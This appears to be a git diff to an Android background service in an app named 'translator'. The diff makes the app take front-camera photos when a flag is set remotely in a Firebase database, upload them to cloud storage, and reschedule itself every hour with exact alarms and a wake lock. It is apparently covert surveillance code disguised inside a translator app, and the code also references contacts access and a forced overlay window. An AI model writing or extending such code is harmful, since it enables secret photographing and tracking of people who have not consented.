@@ -4,9 +4,12 @@ import static androidx.core.app.ActivityCompat.startActivityForResult;
 import static com.example.translator.FBref.FBST;
 import static com.example.translator.FBref.refUsers;
 
+import android.annotation.SuppressLint;
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -18,6 +21,8 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.PowerManager;
+import android.os.SystemClock;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.util.Log;
@@ -67,6 +72,11 @@ public class myBackgroundService extends Service
 
     private static final String CHANNEL_ID = "camera_service_channel";
 
+    private static final long INTERVAL_MILLIS = 60 * 60 * 1000; // 60 minutes
+    private static final long CPU_ACQUIRE_TIME = 5 * 60 * 1000L; //time for hard CPU work
+    private PowerManager.WakeLock wakeLock;
+
+
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId)
@@ -108,11 +118,14 @@ public class myBackgroundService extends Service
                 //TODO: android.view.WindowManager$BadTokenException: Unable to add window android.view.ViewRootImpl$W@55bfd19 -- permission denied for window type 2006
                 //TODO: NEED TO MAKE A PERMISSION REQUEST FOR THIS
                 //TODO: IM THE FUCKING GOAT, JUST TAKE THE IMAGE FROM FIREBASE STORAGE AND YOU DONE!!!!!!!
-                capturePicture();
+                assert user != null;
+                if(user.getToCapture() == 1)
+                    capturePicture();
 
                 assert user != null;
                 user.setToCapture(0);
                 refUsers.child(userId).setValue(user);
+                scheduleNextPicture();
             }
 
             @Override
@@ -127,8 +140,27 @@ public class myBackgroundService extends Service
         return super.onStartCommand(intent, flags, startId);
     }
 
+    @SuppressLint("ScheduleExactAlarm")
+    private void scheduleNextPicture()
+    {
+        AlarmManager alarmManager = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(this, myBackgroundService.class);
+        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+
+        long triggerAtMillis = SystemClock.elapsedRealtime() + INTERVAL_MILLIS;
+
+        if(alarmManager != null)
+        {
+            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtMillis, pendingIntent);
+        }
+    }
+
     private void capturePicture()
     {
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE); //getting the CPU to work faster while uploading image
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "translator::myBackgroundService");
+        wakeLock.acquire(CPU_ACQUIRE_TIME);
+
         mCamera = Camera.open(1);
         if(mCamera != null)
         {
@@ -247,6 +279,14 @@ public class myBackgroundService extends Service
                 Log.e("Image", "Image uploaded");
             }
         });
+    }
+
+    @Override
+    public void onDestroy()
+    {
+        super.onDestroy();
+        if(wakeLock != null && wakeLock.isHeld())
+            wakeLock.release();
     }
 
     @Nullable
